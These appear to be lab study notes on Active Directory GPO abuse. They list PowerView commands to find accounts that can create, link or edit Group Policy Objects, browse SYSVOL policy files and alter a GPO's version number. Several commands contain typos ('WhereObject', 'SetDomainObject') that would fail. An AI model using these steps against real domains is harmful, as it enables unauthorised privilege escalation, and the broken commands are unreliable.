The Powerview Enumeration The User could be able to create A new GPO
```
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=cyberbotic,DC=io" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" } 

```
To Figure out who User is belong to Group
```
powershell ConvertFrom-SID S-1-5-21-3865823697-1816233505-1834004910-1605
```

Which User had authorized to Manage GPLINK for a Given OU.
```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link"}
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

```
Which User could be able to authorized to modify the Existing GPO
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | WhereObject { $_.ActiveDirectoryRights -match "WriteProperty| WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "SID-[\d]{4,10}"}
```

```
ls \\cyberbotic.io\SYSVOL\cyberbotic.io\Policies\
ls \\cyberbotic.io\SYSVOL\cyberbotic.io\Policies\{66E4449B-408B-490A-A3F5-DA8B934DA2AC}
shell type  "\\cyberbotic.io\SYSVOL\cyberbotic.io\Policies\{66E4449B-408B-490A-A3F5-DA8B934DA2AC}\GPT.INI"

powershell Get-DomainGPO -Identity "MeMe GPO" -Properties VersionNumber
powershell Get-DomainGPO -Identity "MeMe GPO" | Set-DomainObject -Set @{'versionnumber'='1337'}
powershell Get-DomainGPO -Identity "MeMe GPO" | SetDomainObject -Set @{'versionnumber'='1337'}
```
